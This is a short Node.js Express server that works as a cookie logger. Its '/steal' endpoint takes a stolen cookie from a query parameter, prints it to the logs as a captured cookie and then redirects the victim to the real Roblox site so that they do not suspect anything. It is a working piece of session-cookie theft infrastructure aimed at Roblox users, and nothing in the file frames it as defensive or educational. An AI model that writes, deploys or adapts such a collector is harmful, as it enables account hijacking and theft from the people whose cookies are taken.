const express = require('express');
const app = express();
const port = process.env.PORT || 3000;

app.get('/steal', (req, res) => {
  const cookie = req.query.c;
  if (cookie) {
    // Log the cookie to Railway logs or append to a file
    console.log('CAPTURED COOKIE:', cookie);
    // Optionally store in a simple database or send to a webhook
  }
  // Redirect to a real Roblox page so the victim doesn't suspect
  res.redirect('https://www.roblox.com');
});

app.get('/', (req, res) => res.send('logger active'));

app.listen(port, () => console.log('Logger running'));
